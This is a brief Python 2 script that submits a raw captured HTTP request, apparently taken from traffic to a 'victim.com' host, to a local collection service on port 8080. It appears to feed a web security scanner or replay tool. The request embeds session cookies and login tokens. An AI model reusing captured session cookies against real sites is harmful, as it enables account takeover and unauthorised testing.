import MultipartPostHandler
import urllib2

url = 'http://127.0.0.1:8080/collect?ip=192.168.229.138&username=whogoes'

request = """POST /cgi-bin/publish?id=850007897 HTTP/1.1\r\nAccept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\r\nReferer: http://cdn.victim.com/toolpages/utf8.html\r\nAccept-Language: zh-CN\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2)\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip, deflate\r\nHost: ao.victim.com\r\nContent-Length: 52\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\nCookie: vid=969633478; ggid=o0634781712; ac=1,030,005; loginid=1712; o_c=73713; lid=o01712; lkey=d5a3d94c908530b4eb6fbab9987; id_c=73713; eid_c=3F9287D6239E6753363B318412A1296; id=o01712; ssid=pBpd8fmvM; ptisp=ctc; show_id=\r\n\r\nwho=1&con=0110&feedversion=1&ver=1&hostid=1712"""

params = {'request': request}
opener = urllib2.build_opener(MultipartPostHandler.MultipartPostHandler)
print opener.open(url, params).read()
